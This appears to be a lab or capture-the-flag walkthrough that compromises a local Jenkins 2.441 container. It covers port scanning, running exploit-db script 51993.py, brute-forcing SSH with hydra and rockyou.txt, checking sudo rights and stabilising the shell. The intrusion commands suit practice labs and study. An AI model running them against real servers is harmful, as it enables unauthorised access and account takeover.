![image](https://github.com/user-attachments/assets/0cb3d581-c87a-416d-b473-93d195490f87)


```bash
ping -c 1 172.17.0.2
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```
![image](https://github.com/user-attachments/assets/b92223b9-e47a-47c2-a3cb-d60f3daa2a97)

## **We have a web page running on port 8080**

![image](https://github.com/user-attachments/assets/b723c382-958a-48ed-8433-c8e350fc7320)

## **Researching the web**
```bash
whatweb http://172.17.0.2:8080
```
![image](https://github.com/user-attachments/assets/01227e0c-8480-4b17-8c5c-6cab5025b306)

## **We search for possible vulnerabilities and exploits**
```bash
searchsploit jenkins 2.441
```
![image](https://github.com/user-attachments/assets/9b1413f6-8369-4d9d-b86e-4f956da458fa)

## **We bring to our working folder for further exploitation**
```bash
❯ locate java/webapps/51993.py
/usr/share/exploitdb/exploits/java/webapps/51993.py
❯ mv /usr/share/exploitdb/exploits/java/webapps/51993.py .
❯ ls
 51993.py
```
## **we run exploit**
``` bash
python3 51993.py -u http://172.17.0.2:8080
```
![image](https://github.com/user-attachments/assets/fa4e8b44-0c3c-4a55-822c-ab9c1a462b2e)

## **We will apply a brute force attack with hydra on port 22 with the user that we find**
```bash
hydra -l bobby -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
![image](https://github.com/user-attachments/assets/3499650a-5ae9-43ca-ad4c-c89cb8ae7931)

## **Now we will log in via ssh**
```bash
ssh bobby@172.17.0.2
```
![image](https://github.com/user-attachments/assets/2293eb00-7d0e-4e22-8dfd-a3b1485fe7fe)

## **Once inside it's time to escalate privileges**
```bash
sudo -l
```
![image](https://github.com/user-attachments/assets/682b3ea1-0c6c-42f1-99d1-1e630f08d146)
![image](https://github.com/user-attachments/assets/33ce0d41-31af-49dd-8980-8d552bd1441b)

## **Treatment of tty**
```bash
script /dev/null -c bash
"CTRL+Z"
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```



